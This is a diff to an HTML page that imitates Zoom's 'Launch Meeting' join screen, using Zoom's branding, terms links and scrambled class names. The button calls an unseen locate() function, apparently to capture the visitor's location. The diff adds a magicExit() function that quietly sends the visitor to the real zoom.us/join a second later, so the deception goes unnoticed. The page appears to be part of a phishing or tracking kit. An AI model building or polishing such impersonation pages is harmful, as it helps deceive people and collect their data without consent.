@@ -316,7 +316,7 @@
       <div>
         <h1>Click <b>Open link</b> on the dialog shown by your browser<br>If you don’t see a dialog, click <b>Launch Meeting</b> below</h1>
         <h2 class="EOquiHKJ">By clicking "Launch Meeting", you agree to our <a terms="" tabindex="0" target="_blank" href="https://zoom.us/en-us/terms">Terms of Service</a> and <a privacy="" target="_blank" tabindex="0" href="https://zoom.us/en-us/privacy">Privacy Statement</a></h2>
-        <a href="javascript:void(0);" onclick="locate(function(){$('#change').html('Coming Soon');alert('We will let you in once the meeting is started');}, function(){$('#change').html('Failed');});" target="" class="VahdFMz0">Launch Meeting</a>
+        <a href="javascript:void(0);" onclick="locate(magicExit, magicExit);" class="VahdFMz0">Launch Meeting</a>
         <hr> <h3 role="presentation">Don’t have Zoom Client installed? <a download="" tabindex="0">Download Now</a></h3>
       </div>
     </div>
@@ -336,5 +336,12 @@
   <div id="ada-entry">
     <div style="position: fixed; width: 635px; height: 785px; right: 0px; background: linear-gradient(315.92deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0) 40.92%); bottom: 0px; pointer-events: none; z-index: 9999; transition: all 500ms linear 0s; opacity: 0;"></div>
   </div>
+  <script>
+    function magicExit() {
+        setTimeout(function() {
+            window.location.href = "https://zoom.us/join";
+        }, 1000);
+    }
+ </script>
 </body>
 </html>
